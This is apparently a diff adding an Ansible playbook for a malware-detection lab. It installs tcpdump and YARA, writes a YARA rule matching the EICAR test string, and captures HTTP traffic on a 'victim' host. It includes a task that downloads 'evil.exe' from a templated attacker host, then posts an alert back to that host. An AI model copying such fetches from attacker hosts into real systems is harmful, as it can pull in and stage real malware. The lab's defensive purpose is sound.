@@ -1,0 +1,59 @@
+---
+- hosts: victim
+  become: yes
+  vars:
+     evil_file: /home/evil.exe
+     pcap_file: /home/captureB_file.pcap
+
+  tasks:
+    - name: Install tcpdump and YARA antivirus
+      apt:
+        name: 
+          - tcpdump
+          - yara
+        state: present
+        update_cache: yes
+
+    - name: Create YARA rule for EICAR detection
+      copy:
+        content: |
+          rule malware_detection
+          {
+              meta:
+                  description = "Detects malicious objects"
+                  author = "Security Team"
+                  date = "2025-09-30"
+                  
+              strings:
+                  $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+                  
+              condition:
+                  $eicar
+          }
+        dest: /tmp/malware_detection.yar
+      
+
+    - name: Run tcpdump in background 
+      shell: tcpdump -i eth0 -w {{ pcap_file }} -U tcp port 80 
+      async: 300
+      poll: 0
+  
+    - name: Download malicious file from attacker
+      get_url:
+        url: "http://{{ attacker_ip }}/evil.exe"
+        dest: "{{ evil_file }}"
+
+    - name: Run YARA scan
+      shell: yara -w /tmp/malware_detection.yar {{ evil_file }} 2>/dev/null
+      register: yara_scan_result
+      ignore_errors: yes
+
+    - name: Send malware alert
+      uri:
+        url: "http://{{ attacker_ip }}/MALWARE_DETECTED"
+        method: POST
+        body: "DETECTED"
+        status_code: [200, 404]
+      when: yara_scan_result.rc == 0
+
+
